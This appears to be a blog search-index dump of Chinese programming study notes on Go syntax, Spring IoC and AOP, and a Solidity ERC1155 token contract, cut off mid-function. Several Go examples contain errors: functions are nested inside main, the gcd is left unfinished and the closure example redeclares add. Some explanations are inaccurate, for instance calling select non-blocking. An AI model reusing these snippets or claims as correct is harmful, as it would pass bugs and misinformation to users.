遍历Map   for site := range siteMap &#123;      fmt.Println(site, &quot;首都是&quot;, siteMap [site])   &#125;   // 获取元素   v1 := siteMap[ &quot;Google&quot; ]   // 修改元素   siteMap[ &quot;Wiki&quot; ] = &quot;维基&quot;   // 获取Map的长度   len := len(siteMap)   /*查看元素在集合中是否存在 */   name, ok := siteMap [ &quot;Facebook&quot; ] /*如果确定是真实的,则存在,否则不存在 */   /*fmt.Println(capital) */   /*fmt.Println(ok) */   if (ok) &#123;      fmt.Println(&quot;Facebook 的 站点是&quot;, name)   &#125; else &#123;      fmt.Println(&quot;Facebook 站点不存在&quot;)   &#125;&#125;\ndelete()函数package mainimport &quot;fmt&quot;func main() &#123;   /* 创建map */   countryCapitalMap := map[string]string&#123;&quot;France&quot;: &quot;Paris&quot;, &quot;Italy&quot;: &quot;Rome&quot;, &quot;Japan&quot;: &quot;Tokyo&quot;, &quot;India&quot;: &quot;New delhi&quot;&#125;   fmt.Println(&quot;原始地图&quot;)   /* 打印地图 */   for country := range countryCapitalMap &#123;      fmt.Println(country, &quot;首都是&quot;, countryCapitalMap [ country ])   &#125;   /*删除元素*/    delete(countryCapitalMap, &quot;France&quot;)   fmt.Println(&quot;法国条目被删除&quot;)   fmt.Println(&quot;删除元素后地图&quot;)   /*打印地图*/   for country := range countryCapitalMap &#123;      fmt.Println(country, &quot;首都是&quot;, countryCapitalMap [ country ])   &#125;&#125;\n类型转换数值类型转换package mainimport &quot;fmt&quot;func main() &#123;   var sum int = 17   var count int = 5   var mean float32      mean = float32(sum)/float32(count)   fmt.Printf(&quot;mean 的值为: %f\\n&quot;,mean)&#125;\n字符串类型转换熟习strconv包中的Atoi()和Itoa()函数\n\nAtoi()函数返回两个值，第一个是转换后的整型值，第二个是可能发生的错误，我们可以使用空白标识符_来忽略这个错误\n\npackage mainimport (    &quot;fmt&quot;    &quot;strconv&quot;)func main() &#123;   str := &quot;123&quot;   num, err := strconv.Atoi(str)   if err != nil &#123;      fmt.Println(&quot;转换错误:&quot;, err)   &#125; else &#123;      fmt.Printf(&quot;字符串 &#x27;%s&#x27; 转换为整数为：%d\\n&quot;, str, num)   &#125;&#125;\n\n接口接口可以让我们将不同的类型绑定到一组公共的方法上，从而实现多态和灵活的设计。\nGo 语言中的接口是隐式实现的，也就是说，如果一个类型实现了一个接口定义的所有方法，那么它就自动地实现了该接口。因此，我们可以通过将接口作为参数来实现对不同类型的调用，从而实现多态。\n接口类型转换\n类型断言将接口类型转换为指定类型：value.(type)或value.(T)\n如果类型断言成功，它将返回转换后的值和一个布尔值，表示转换是否成功。\n\n类型转换\n\n\n将一个接口类型的值转换为另一个接口类型：T(value)\n在类型转换中，我们必须保证要转换的值和目标接口类型之间是兼容的。\npackage mainimport &quot;fmt&quot;func main() &#123;   var i interface&#123;&#125; = &quot;Hello, World&quot;   str, ok := i.(string)   if ok &#123;      fmt.Printf(&quot;&#x27;%s&#x27; is a string\\n&quot;, str)   &#125; else &#123;      fmt.Println(&quot;conversion failed&quot;)   &#125;&#125;// 例二type Writer interface &#123;    Write([]byte) (int, error)&#125;type StringWriter struct &#123;    str string&#125;func (sw *StringWriter) Write(data []byte) (int, error) &#123;    sw.str += string(data)    return len(data), nil&#125;func main() &#123;    var w Writer = &amp;StringWriter&#123;&#125;    sw := w.(*StringWriter)    sw.str = &quot;Hello, World&quot;    fmt.Println(sw.str)&#125;\n\n通道 channel通道（channel）是用来传递数据的一个数据结构。\n通道可用于两个goroutine之间通过传递一个指定类型的值来同步运行和通讯。操作符&lt;-用于指定通道的方向，发送或接收。如果未指定方向，则为双向通道。\n声明：使用chan关键字，通道在使用前必须先创建：ch := make(chan int)\n通道缓冲区\n","categories":["Golang"]},{"title":"变量与常量","url":"/2023/05/25/Golang/go-variable/","content":"变量变量声明var关键字\n第一种指定变量类型，如果没有初始化，则变量默认为零值。\n\n零值就是变量没有做初始化时系统默认设置的值。数值类型（包括complex64&#x2F;128）为0布尔类型为false字符串为 &quot;&quot;（空字符串）以下几种类型为nil：指针、数组、map、channel、函数、接口\n\n第二种根据值自行判定变量类型。\n第三种格式：v_name := value\n如果变量已经使用var声明过了，再使用:=声明变量，就产生编译错误。\n\n多变量声明var vname1, vname2, vname3 type 相同类型的多个变量vname1, vname2, vname3 = v1, v2, v3 \nvar vname1, vname2, vname3 = v1, v2, v3自动推断类型  \n一般用于声明全局变量var {    vname type1    vname type2}\n\n注意事项如果你在定义变量a之前使用它，则会得到编译错误undefined: a\n如果你声明了一个局部变量却没有在相同的代码块中使用它，同样会得到编译错误，a declared but not used；但是全局变量是允许声明但不使用的。\n如果你想要交换两个变量的值，则可以简单地使用a, b = b, a，两个变量的类型必须是相同。这被称为并行或同时赋值。\n并行赋值也被用于当一个函数返回多个返回值时，比如这里的val和错误err是通过调用Func1函数同时得到：val, err = Func1(var1)\n空白标识符_也被用于抛弃值，如值5在：_, b = 5, 7中被抛弃。\n变量作用域Go语言中变量可在三个地方中声明\n\n函数内定义：局部变量\n函数外定义：全局变量\n函数定义中：形式参数\n\n局部变量的作用域只在函数体内，参数和返回值变量也是局部变量。\n全局变量可以在整个包甚至外部包（被导出后）使用。\nGo语言程序中全局变量与局部变量名称可以相同，但是函数内的局部变量会被优先考虑。\n形式参数会作为函数的局部变量来使用。\n\n可通过花括号来控制变量的作用域，花括号中的变量是单独的作用域，同名变量会覆盖外层。\n\n常量常量是一个简单值的标识符，在程序运行时，不会被修改的量。\n常量中的数据类型只可以是布尔型、数字型（整数型、浮点型和复数）和字符串型。\n常量的定义格式：const identifier [type] = value  \n\n你可以省略类型说明符[type]，编译器可以根据变量的值来推断其类型。\n\n显式类型定义：const b string = &quot;abc&quot;\n隐式类型定义：const b = &quot;abc&quot;多个相同类型的声明可以简写为：const c_name1, c_name2 = value1, value2\n\n\n实例package mainimport &quot;fmt&quot;func main() &#123;    const LENGTH int = 2    const WIDTH int = 6    var area int    const a, b, c = 1, false, &quot;str&quot; //多重赋值    const (        Unknow = 0        Female = 1        Male = 2    ) //枚举赋值    area = LENGTH * WIDTH    fmt.Printf(&quot;面积为：%d\\n&quot;, area)    println(a, b, c)&#125;\n\n常量可以用len(), cap(), unsafe.Sizeof()函数计算表达式的值。常量表达式中，函数必须是内置函数，否则编译不过。\n\niotaiota，特殊常量，可认为是一个可以被编译器修改的常量。\niota在const关键字出现时将被重置为 0(const 内部的第一行之前)，const 中每新增一行常量声明将使 iota 计数一次(iota 可理解为 const 语句块中的行索引)。\n待补充\n值类型和引用类型使用值类型的变量直接指向存在内存中的值，一个引用类型的变量r1存储的是r1的值所在的内存地址（数字），或内存地址中第一个字所在的位置。也称指针&amp;符号取变量的内存地址。值类型变量使用等号=将一个变量的值赋值给另一个变量时，实际上是在内存中将 i 的值进行了拷贝，使用赋值语句r2 = r1时，只有引用（地址）被复制。对r1的修改也会对r2产生影响\n&#x2F;&#x2F;\n","categories":["Golang"]},{"title":"Go环境安装","url":"/2023/05/05/Golang/go_env/","content":"Go语言开发了适用于以下操作系统的编译器：\n\nLinux\nFreeBSD\nMac OS X\n\n环境安装\n添加PATH变量\nGo 开发环境依赖于一些操作系统环境变量，你最好在安装 Go 之前就已经设置好他们。\n这里列举几个最为重要的环境变量：\n\n$GOROOT表示Go在你的电脑上的安装位置，它的值一般都是 $HOME/go，当然，你也可以安装在别的地方。\n$GOPATH默认采用和$GOROOT一样的值，但从Go 1.1版本开始，你必须修改为其它路径。它可以包含多个Go语言源码文件、包文件和可执行文件的路径，而这些路径下又必须分别包含三个规定的目录：src、pkg 和 bin，这三个目录分别用于存放源码文件、包文件和可执行文件。\n\n接下来让我们继续安装吧：\n\nLinux\n\n配置环境变量：export GOROOT=$HOME/go\n保证在文件系统的任何地方都能调用相关文件：export PATH=$PATH:$GOROOT/bin\n配置Go项目的工作目录：export GOPATH=$HOME/Applications/Go\n在完成上述设置后，需要在终端输入source .bashrc以使这些环境变量生效。然后重启终端，输入go env来检查环境变量是否设置正确。\n\n\nWindows\n 默认安装在目录c:/go下。\n\n\n\n下载二进制包\n\nLinux\n 在安装Go之前你需要先安装相关的C工具。\n sudo apt-get install bison ed gawk gcc libc6-dev make（此处为Ubuntu的指令，你也可以需要将工具分开安装）\n 接着去官网或镜像网站下载Go的源码包到计算机中，然后将解压后的目录go通过命令移动到$GOROOT的位置。\n wget https://storage.googleapis.com/golang/go&lt;VERSION&gt;.src.tar.gztar -zxvf go&lt;VERSION&gt;.src.tar.gzsudo mv go $GOROOT\nMac\n\nWindows\n\n\n\n安装\n你的Go安装目录 ($GOROOT) 的文件夹结构应该如下所示：\nREADME.md, AUTHORS, CONTRIBUTORS, LICENSE\n\n/bin：包含可执行文件，如：编译器，Go工具\n/doc：包含文档模版\n/lib：包含示例程序，代码工具，本地文档等\n/misc：包含与支持Go编辑器有关的配置文件以及cgo的示例\n/os_arch：包含标准库的包的对象文件 (.a)\n/src：包含源代码构建脚本和标准库的包的完整源代码（Go是一门开源语言）\n/src/cmd：包含Go和C的编译器和命令行脚本\n\n\n添加\n\n安装测试\n在一个文件夹中新建test.go文件，\npackage mainimport &quot;fmt&quot;func main() &#123;   fmt.Println(&quot;Hello, World!&quot;)&#125;\n通过go命令执行以上代码输出结果如下：go run test.go\n还可以通过go build命令生成二进制文件\n\n验证安装版本\n\n\n可以通过在终端输入go version来打印Go的版本信息。\n在创建目录的时候，文件夹名称永远不应该包含空格，而应该使用下划线’_’或者其他一般符号代替。\n","categories":["Golang"]},{"title":"条件语句","url":"/2023/05/27/Golang/go-conditionalStatement/","content":"条件语句if语句由一个布尔表达式后紧跟一个或多个语句组成。\nif…else语句if 语句后可以使用可选的else语句,else语句中的表达式在布尔表达式为false时执行。\nif嵌套语句你可以在if或else if语句中嵌入一个或多个if或else if语句。\nswitch语句用于基于不同条件执行不同动作。每一个case分支都是唯一的，从上至下逐一测试，直到匹配为止。\nswitch默认情况下case最后自带break语句，匹配成功后就不会执行其他case；如果我们需要执行后面的case，可以使用fallthrough\nswitch var1 &#123;    case val1:    //必须是同类型的任意值        ...    case val2, val3, val4:    //可以同时测试多个值，使用逗号分割        ...    default:        ...&#125;\n\nfallthrough使用fallthrough会强制执行后面的case语句，fallthrough不会判断下一条case的表达式结果是否为true。（默认执行）\n\nselect语句类似switch但是select会随机执行一个可运行的case。如果没有case可运行，它将阻塞，直到有case可运行。\n\nGo没有三目运算符，所以不支持 ?: 形式的条件判断。\n\n","categories":["Golang"]},{"title":"并发","url":"/2023/05/27/Golang/go-complicated/","content":"并发Go语言支持并发，我们只需要通过go关键字来开启goroutine即可。\ngoroutine是轻量级线程，goroutine的调度是由Golang运行时进行管理的。\n语法：go 函数名()开启一个新的goroutine\n同一个程序中的所有goroutine共享同一个地址空间。\n","categories":["Golang"]},{"title":"循环语句","url":"/2023/05/27/Golang/go-loopStatement/","content":"循环语句for循环for循环是一个循环控制结构，可以执行指定次数的循环。\nGo语言的For循环有3种形式，只有其中的一种使用分号。\n与C一样for init; condition; post &#123; &#125;  \n\n先对表达式1赋初值；\n判别赋值表达式init是否满足给定条件，若满足循环条件，则执行循环体内语句，然后执行post，进入第二次循环，再判别condition；否则不满足条件，就终止for循环，执行循环体外语句。\n\n与C的while一样for condition &#123; &#125;\n与C的for(;;)一样for &#123; &#125;\nfor rangefor循环的range格式可以对slice、map、数组、字符串等进行迭代循环。格式如下：\nfor key, value := range oldMap &#123;    newMap[key] = value&#125;\n如果只想读取 key，格式如下：\nfor key := range oldMap\n或者这样：\nfor key, _ := range oldMap\n如果只想读取 value，格式如下：\nfor _, value := range oldMap  //必须使用_来占位\n循环嵌套在循环内使用循环。\n以下为 Go 语言嵌套循环的格式：\nfor [condition |  ( init; condition; increment ) | Range]&#123;   for [condition |  ( init; condition; increment ) | Range]   &#123;      statement(s);   &#125;   statement(s);&#125;\n实例输出100内的所有素数\npackage mainimport &quot;fmt&quot;func main() &#123;   var i, j int   for i=2; i &lt; 100; i++ &#123;      for j=2; j &lt;= (i/j); j++ &#123;         if(i%j==0) &#123;            break; // 如果发现因子，则不是素数         &#125;      &#125;      if(j &gt; (i/j)) &#123;         fmt.Printf(&quot;%d  是素数\\n&quot;, i);      &#125;   &#125;  &#125;\n无限循环如果循环中条件语句永远不为false则会进行无限循环，我们可以通过for循环语句中只设置一个条件表达式来执行无限循环\n循环控制语句break语句Go语言中break语句用于以下两方面：\n\n用于循环语句中跳出循环，并开始执行循环之后的语句。\nbreak在switch（开关语句）中在执行一条case后跳出语句的作用。\n在多重循环中，可以用标号label标出想break的循环。\n\n\n在Go语言中，break语句在select语句中的应用是相对特殊的。由于select语句的特性，break语句并不能直接用于跳出select语句本身，因为 select 语句是非阻塞的，它会一直等待所有的通信操作都准备就绪。如果需要提前结束 select 语句的执行，可以使用return或者goto语句来达到相同的效果。\n\ncontinue语句跳过当前循环的剩余语句，然后继续进行下一轮循环。\n\nfor循环中，执行continue语句会触发for增量语句的执行。\n在多重循环中，可以用标号label标出想continue的循环。\n\ngoto语句Go 语言的goto语句可以无条件地转移到过程中指定的行。\ngoto 语句通常与条件语句配合使用。可用来实现条件转移， 构成循环，跳出循环体等功能。\n但是，在结构化程序设计中一般不主张使用goto语句， 以免造成程序流程的混乱，使理解和调试程序都产生困难。\n语法格式goto label;...label: statement;\n实例package mainimport &quot;fmt&quot;func main() &#123;   var a int = 10   /* 循环 */   LOOP: for a &lt; 20 &#123;      if a == 15 &#123;         /* 跳过迭代 */         a = a + 1         goto LOOP      &#125;      fmt.Printf(&quot;a的值为 : %d\\n&quot;, a)      a++       &#125;  &#125;\n","categories":["Golang"]},{"title":"错误处理","url":"/2023/05/27/Golang/go-error/","content":"错误处理Go 语言通过内置的错误接口提供了非常简单的错误处理机制。\nerror 类型是一个接口类型\n介绍一下 panic 与 recover,一个用于主动抛出错误，一个用于捕获panic抛出的错误。\n","categories":["Golang"]},{"title":"函数","url":"/2023/05/27/Golang/go-function/","content":"函数函数是基本的代码块，用于执行一个任务。\nGo语言最少有个main()函数。\n你可以通过函数来划分不同功能，逻辑上每个函数执行的是指定的任务。\n函数声明告诉了编译器函数的名称，参数和返回类型。\n函数定义func function_name( [parameter list] ) [return_types] &#123;    //your code&#125;\n\nfunc：函数由func开始声明\nfunction_name：函数名称，参数列表和返回值类型构成了函数签名。\nparameter list：参数列表，参数就像一个占位符，当函数被调用时，你可以将值传递给参数，这个值被称为实际参数。参数列表指定的是参数类型、顺序、及参数个数。参数是可选的，也就是说函数也可以不包含参数。\nreturn_types：返回类型，函数返回一列值。return_types 是该列值的数据类型。有些功能不需要返回值，这种情况下 return_types 不是必须的。\n函数体：函数定义的代码集合。\n\n函数返回多个值go语言可以返回多个值，例如：\npackage mainimport &quot;fmt&quot;func swap(x, y string) (string, string) &#123;   return y, x&#125;func main() &#123;   a, b := swap(&quot;Google&quot;, &quot;Runoob&quot;)   fmt.Println(a, b)&#125;\n函数参数函数如果使用参数，该变量可称为函数的形参。\n调用函数，可以通过两种方式来传递参数：\n\n值传递：在调用函数时将实际参数复制一份传递到函数中，这样在函数中如果对参数进行修改，将不会影响到实际参数。\n引用传递：指在调用函数时将实际参数的地址传递到函数中，那么在函数中对参数所进行的修改，将影响到实际参数。\n\n实例package mainimport &quot;fmt&quot;func main() &#123;   var a int = 100   var b int= 200   fmt.Printf(&quot;交换前，a 的值 : %d\\n&quot;, a )   fmt.Printf(&quot;交换前，b 的值 : %d\\n&quot;, b )   swap(a, b)      fmt.Printf(&quot;交换后 a 的值 : %d\\n&quot;, a )   fmt.Printf(&quot;交换后 b 的值 : %d\\n&quot;, b )   swap(&amp;a, &amp;b)   fmt.Printf(&quot;交换后 a 的值 : %d\\n&quot;, a )   fmt.Printf(&quot;交换后 b 的值 : %d\\n&quot;, b )      func swap(x, y int) &#123;      temp := x    /* 保存 x 的值 */      x = y      /* 将 y 值赋给 x */      y = temp    /* 将 temp 值赋给 y */   &#125;   func swap(x *int, y *int) &#123;      var temp int      temp = *x    /* 保存 x 地址上的值 */      *x = *y      /* 将 y 值赋给 x */      *y = temp    /* 将 temp 值赋给 y */   &#125;&#125;\n函数用法作为实参Go语言可以很灵活的创建函数，并作为另外一个函数的实参。\n实例\npackage main import &quot;fmt&quot; // 声明一个函数类型 type cb func(int) intfunc main() &#123;    testCallBack(1, callBack)//执行函数---testCallBack &#125; func testCallBack(x int, f cb) &#123;  //定义了一个函数 testCallBack    f(x)  //由于传进来的是callBack函数，该函数执行需要传入一个int类型参数，因此传入x &#125; func callBack(x int) int &#123;    fmt.Printf(&quot;我是回调，x：%d\\n&quot;, x)    return x &#125;\n闭包闭包是匿名函数，可在动态编程中使用\n匿名函数是一个”内联”语句或表达式。\n匿名函数的优越性：可以直接使用函数内的变量，不必申明。\n实例\npackage mainimport &quot;fmt&quot;// 闭包使用方法func add(x1, x2 int) func() (int, int)  &#123;   i := 0   return func() (int, int)&#123;      i++      return i,x1+x2   &#125;&#125;// 闭包带参数，闭包函数可不用写形参名称func add(x1, x2 int) func(x3 int,x4 int) (int, int, int) &#123;   i := 0   return func(x3 int, x4 int) (int, int, int) &#123;       i++      return i,x1 + x2,x3 + x4   &#125;&#125;func main()&#123;   add_func := add(1,2) //作为一个加法函数，函数i为0   fmt.Println(add_func())   fmt.Println(add_func())   fmt.Println(add_func())   add_func1 := add(1,2) //创建新的函数，add()方法被重新赋值   fmt.Println(add_func1()) //i是1   fmt.Println(add_func()) //尽管外面的函数销毁了，但是内部函数仍然存在，这个就是闭包   fmt.Println(add_func1()) //i是2   add_func := add(1,2)   fmt.Println(add_func(1,1))   fmt.Println(add_func(0,0))   fmt.Println(add_func(2,2))&#125;运行结果：1 32 33 31 34 32 31 3 22 3 03 3 4\n方法一个方法就是一个包含了接受者的函数，接受者可以是命名类型或者结构体类型的一个值或者是一个指针。\n所有给定类型的方法属于该类型的方法集。\n关于值和指针，如果想在方法中改变结构体类型的属性，需要对方法传递指针，体会如下对结构体类型改变的方法 changRadis() 和普通的函数 change() 中的指针操作:\n实例\npackage mainimport (   &quot;fmt&quot;  )/* 定义结构体 */type Circle struct &#123;   radius float64&#125;func (c Circle) getArea() float64  &#123;   return c.radius * c.radius * 3.14&#125;// 注意如果想要更改成功c的值，这里需要传指针func (c *Circle) changeRadius(radius float64)  &#123;   c.radius = radius&#125;   // 以下操作将不生效// func (c Circle) changeRadius(radius float64)  &#123;//   c.radius = radius// &#125;// 引用类型要想改变值需要传指针func change(c *Circle, radius float64)  &#123;   c.radius = radius&#125;func main()  &#123;    var c Circle   fmt.Println(c.radius) // 0   c.radius = 10.00   fmt.Println(c.getArea()) // 314   c.changeRadius(20)   fmt.Println(c.radius) // 20   change(&amp;c, 30)   fmt.Println(c.radius) // 30&#125;\n函数实例返回m,n的最大公因数，最小公倍数\npackage mainimport &quot;fmt&quot;func gcd(a int, b int) int &#123;   for &#123;            &#125;    //递归    if a &gt; b &#123;\t\tval = b\t\ttem = a\t&#125; else &#123;\t\tval = a\t\ttem = b\t&#125;\tif tem%val != 0 &#123;      val = gcd(val, tem-val)\t&#125;\treturn val&#125;func lcm(a int, b int) int &#123;      &#125;\n\n\nGo语言标准库提供了多种可动用的内置的函数。例如，len() 函数可以接受不同类型参数并返回该类型的长度。如果我们传入的是字符串则返回字符串的长度，如果传入的是数组，则返回数组中包含的元素个数。\n\n","categories":["Golang"]},{"title":"SpringAOP","url":"/2022/12/26/SprintBoot/SpringAOP/","content":"Spring AOP是Spring框架体系结构中非常重要的功能模块之一；提供了面向切面编程实现。\n\nSpring AOP的基本概念AOP的概念AOP（Aspect-Oriented Programming）即面向切面编程，相应的就是OOP，面向对象编程。在OOP中，以类作为程序的基本单位，而在AOP中则是以切面作为基本单位。  \n\n在业务处理功能中，通常都有日志记录、事务处理、异常处理等操作，如果是使用OOP可以通过封装或继承的方法实现代码重写来应用到多个业务中，但仍存在同样的代码分散到各个方法中。因此，AOP采取横向抽取机制，将分散在各个方法中的重复代码提取出来，然后在程序编译或运行阶段，再将抽取出来的代码应用到需要执行的地方。  \n\n传统的OOP是无法实现这样的横向抽取机制，因为OOP实现的是父子的纵向重用。但AOP并不是OOP的替代品，而是对OOP的一种补充，进而相辅相成。\nAOP的基本术语\n切面（Aspect）指封装横切到系统功能的类  \n连接点（Joinpoint）指程序运行中的一些时间点（如方法的调用或异常的抛出）  \n切入点（Pointcut）指那些需要处理的连接点，在Spring AOP中，所有的方法执行都是连接点，而切入点是一个描述信息，用来修饰连接点，确定哪些连接点需要被处理。  \n通知（增强处理）由切面添加到特点的连接点（满足切入点规则）的一段代码，\n引入（Introduction）允许在现有的实现类中添加自定义的方法和属性  \n目标对象（Target Object）指所有被通知的对象。\n代理（Proxy）是通知应用到目标对象后，被动态创建的对象\n织入（Weaving）\n\n","categories":["Spring Boot"],"tags":["教程"]},{"title":"SpringIoC","url":"/2022/12/01/SprintBoot/SpringIoC/","content":"简单的对Spring IoC进行介绍,要求理解控制反转的概念；它是如何消减程序的耦合问题的？\n\n基本概念下面从一个生活实例对控制反转进行解释（也称依赖注入(Dependency Injection,DI)，只是执行角度不同，是同一个概念）\n\n如果我们要吃饭，就可以有两种选择：一是自己做；另一种是下馆子。当我们要自己做时，就需要自己准备食材、进行烹饪。而下馆子只需要根据自己的需要让店家提供。控制反转的思想便包含在了上述的例子中：将执行操作交给Spring容器。由容器控制对象的创建以及查找并注入依赖的资源，而资源则集中管理，实现资源的可配置和易管理，降低了使用资源双方的依赖程度，松耦合\n\n常用注解\n在Spring框架中，仅管使用XML配置文件可以很简单地装配Bean，但对于需要配置大量的Bean时，其XML文件会过于庞大，不方便维护。  \n\n因此推荐使用注解(annotation)的方式去装配Bean\n声明Bean的注解\n@Component\n\n\n表示一个组件对象(Bean)\n作用于任何层次上\n无明确角色\n一个泛化的概念\n\n\n@Repository\n\n\n将数据访问层(Dao)的类标识为Bean\n功能与@Component相同\n\n\n@Service\n\n\n标注一个业务逻辑组件类（Service）\n功能与@Component相同\n\n\n@Controller\n\n\n用于标注一个控制器组件类（Spring MVC 的Controller）\n功能与@Component相同\n\n注入Bean的注解\n@Autowired\n\n\n可以对类成员变量、方法及构造方法进行标注，完成自动装配的工作\n消除setter getter方法\n\n\n@Resource\n\n\n与@Autowired功能一样\n区别：默认是按照名称来装配注入的，只有当找不到与名称匹配的Bean时才会按照类型来装配注入；\n@Recourse的两个属性：\nname：指定Bean实例名称\ntype：指定Bean类型\n\n\n\n\n@Qualifier\n\n\n与@Autowired注解配合使用。当@Autowired需要按照名称来装配注入时，则使用@Qualifier\n\nSpring IoC容器（ApplicationContext）负责创建和注入Bean。Spring提供使用XML配置、注解、Java配置以及groovy配置实现Bean的创建和注入。\n实例一 （基于注解的依赖注入）\n步骤：创建Web应用，导入jar包（Spring4件套、第三方依赖包和spring-aop（用于扫描注解））创建Annotation包在该包下创建DAO层在该包下创建Service层在该包下创建Controller层创建配置类创建测试类\n\nDao层代码import ;@Repository//等价于@Repository(name = &quot;theDao&quot;)public class theDao &#123;    public void save() &#123;        System.out.println(&quot;testDao save&quot;);    &#125;&#125;\nService层代码import ;@Service//相当于@Service(&quot;theService&quot;)public class theService &#123;    @Resource(name = &quot;theDao&quot;)    //相当于@Autowired，    private theDao testDao;    public void save() &#123;        System.out.println(&quot;testService save&quot;);        testDao.save();    &#125;&#125;\nController层代码import ;@Controllerpublic class theController &#123;    @Autowired    private theService testService;    public void save() &#123;        testService.save();        System.out.println(&quot;testController save&quot;);    &#125;&#125;\n配置类import ;@Configuration  //声明当前类是配置类，相当于一个XML文件@ComponentScan(&quot;annotation&quot;)    //自动扫描当前包下使用的注解，并注册为Beanpublic class Configannotation &#123;    ...&#125;\n测试类import ;public class TestAnnotation &#123;    public static void main(String[] args) &#123;        AnnotationConfigApplicationContext appCon =             new AnnotationConfigApplicationContext(Configannotation.class);        theController tc =appCon.getBean(theController.class);        tc.save();        appCon.close();    &#125;&#125;\n实例二 （Java配置）Java配置是通过@Configuration和@Bean来实现的  \n\n@Configuration声明当前类作为一个配置类@Bean注解在方法上，声明当前方法的返回值为一个Bean\n\nDao层代码import ;public class theDao &#123;    public void save() &#123;        System.out.println(&quot;testDao save&quot;);    &#125;&#125;\nService层代码import ;public class theService &#123;    theDao testDao;    public void setTestDao(theDao testDao)&#123;        this.testDao = testDao;    &#125;    public void save() &#123;        testDao.save();    &#125;&#125;\nController层代码import ;public class theController &#123;    @Autowired    theService testService;    public void setTestService(theService testService) &#123;        this.testService = testService;    &#125;    public void save() &#123;        testService.save();    &#125;&#125;\n配置类import ;@Configuration  //声明当前类是配置类，相当于一个XML文件public class Configannotation &#123;    @Bean    public theDao getTestDao() &#123;        return new theDao();    &#125;    @Bean    public theService getTestService() &#123;        theService ts = new theService();        ts.setTestDao(getTestDao());        return ts;    &#125;    @Bean    public theController getTestController() &#123;        theController ts = new theController();        ts.setTestService(getTestService());        return ts;    &#125;&#125;\n测试类import ;public class TestConfig &#123;    public static void main(String[] args) &#123;        //初始化Spring容器ApplicationContext        AnnotationConfigApplicationContext appCon =         new AnnotationConfigApplicationContext(Configannotation.class);        theController tc =appCon.getBean(theController.class);        tc.save();        appCon.close();    &#125;&#125;\n总结\n控制反转是一种通过描述（可以是xml或注解）并通过第三方产生或获取特定对象的方式。\n在Spring中实现控制反转的是IoC容器\n实现方法是依赖注入\n\n\n常用注解\n两种Bean的创建和注入：通过对比可以看出，有时候使用Java配置反而更加繁琐。\n全局配置尽量使用Java配置\n业务Bean的配置尽量使用注解配置\n\n\n\n","categories":["Spring Boot"],"tags":["教程"]},{"title":"ERC1155","url":"/2023/03/12/ERC1155/","content":"interface IERC1155 &#123;    function safeTransferFrom(        address from,        address to,        uint256 id,        uint256 value,        bytes calldata data    ) external;    function safeBatchTransferFrom(        address from,        address to,        uint256[] calldata ids,        uint256[] calldata values,        bytes calldata data    ) external;    function balanceOf(address owner, uint256 id) external view returns (uint256);    function balanceOfBatch(        address[] calldata owners,        uint256[] calldata ids    ) external view returns (uint256[] memory);    function setApprovalForAll(address operator, bool approved) external;    function isApprovedForAll(        address owner,        address operator    ) external view returns (bool);&#125;interface IERC1155TokenReceiver &#123;    function onERC1155Received(        address operator,        address from,        uint256 id,        uint256 value,        bytes calldata data    ) external returns (bytes4);    function onERC1155BatchReceived(        address operator,        address from,        uint256[] calldata ids,        uint256[] calldata values,        bytes calldata data    ) external returns (bytes4);&#125;\n\n// SPDX-License-Identifier: MITpragma solidity ^0.8.20;contract ERC1155 is IERC1155 &#123;    event TransferSingle(        address indexed operator,        address indexed from,        address indexed to,        uint256 id,        uint256 value    );    event TransferBatch(        address indexed operator,        address indexed from,        address indexed to,        uint256[] ids,        uint256[] values    );    event ApprovalForAll(        address indexed owner,        address indexed operator,        bool approved    );    event URI(string value, uint256 indexed id);    // owner =&gt; id =&gt; balance    mapping(address =&gt; mapping(uint256 =&gt; uint256)) public balanceOf;    // owner =&gt; operator =&gt; approved    mapping(address =&gt; mapping(address =&gt; bool)) public isApprovedForAll;    function balanceOfBatch(        address[] calldata owners,        uint256[] calldata ids    ) external view returns (uint256[] memory balances) &#123;        require(owners.length == ids.length, &quot;owners length != ids length&quot;);        balances = new uint[](owners.length);        unchecked &#123;            for (uint256 i = 0; i &lt; owners.length; i++) &#123;                balances[i] = balanceOf[owners[i]][ids[i]];            &#125;        &#125;    &#125;    function setApprovalForAll(address operator, bool approved) external &#123;        isApprovedForAll[msg.sender][operator] = approved;        emit ApprovalForAll(msg.sender, operator, approved);    &#125;    function safeTransferFrom(        address from,        address to,        uint256 id,        uint256 value,        bytes calldata data    ) external &#123;        require(            msg.sender == from || isApprovedForAll[from][msg.sender],            &quot;not approved&quot;        );        require(to != address(0), &quot;to = 0 address&quot;);        balanceOf[from][id] -= value;        balanceOf[to][id] += value;        emit TransferSingle(msg.sender, from, to, id, value);        if (to.code.length &gt; 0) &#123;            require(                IERC1155TokenReceiver(to).onERC1155Received(                    msg.sender,                    from,                    id,                    value,                    data                ) == IERC1155TokenReceiver.onERC1155Received.selector,                &quot;unsafe transfer&quot;            );        &#125;    &#125;    function safeBatchTransferFrom(        address from,        address to,        uint256[] calldata ids,        uint256[] calldata values,        bytes calldata data    ) external &#123;        require(            msg.sender == from || isApprovedForAll[from][msg.sender],            &quot;not approved&quot;        );        require(to != address(0), &quot;to = 0 address&quot;);        require(ids.length == values.length, &quot;ids length != values length&quot;);        for (uint256 i = 0; i &lt; ids.length; i++) &#123;            balanceOf[from][ids[i]] -= values[i];            balanceOf[to][ids[i]] += values[i];        &#125;        emit TransferBatch(msg.sender, from, to, ids, values);        if (to.code.length &gt; 0) &#123;            require(                IERC1155TokenReceiver(to).onERC1155BatchReceived(                    msg.sender,                    from,                    ids,                    values,                    data                ) == IERC1155TokenReceiver.onERC1155BatchReceived.selector,                &quot;unsafe transfer&quot;            );        &#125;    &#125;    // ERC165    function supportsInterface(bytes4 interfaceId) external view returns (bool) &#123;        return            interfaceId == 0x01ffc9a7 || // ERC165 Interface ID for ERC165            interfaceId == 0xd9b67a26 || // ERC165 Interface ID for ERC1155            interfaceId == 0x0e89341c; // ERC165 Interface ID for ERC1155MetadataURI    &#125;    // ERC1155 Metadata URI    function uri(uint256 id) public view virtual returns (string memory) &#123;&#125;    // Internal functions    function _mint(address to, uint256 id, uint256 value, bytes memory data) internal &#123;        require(to != address(0), &quot;to = 0 address&quot;);        balanceOf[to][id] += value;        emit TransferSingle(msg.sender, address(0), to, id, value);        if (to.code.length &gt; 0) &#123;            require(                IERC1155TokenReceiver(to).onERC1155Received(                    msg.sender,                    address(0),                    id,                    value,                    data                ) == IERC1155TokenReceiver.onERC1155Received.selector,                &quot;unsafe transfer&quot;            );        &#125;    &#125;    function _batchMint(        address to,        uint256[] calldata ids,        uint256[] calldata values,        bytes calldata data    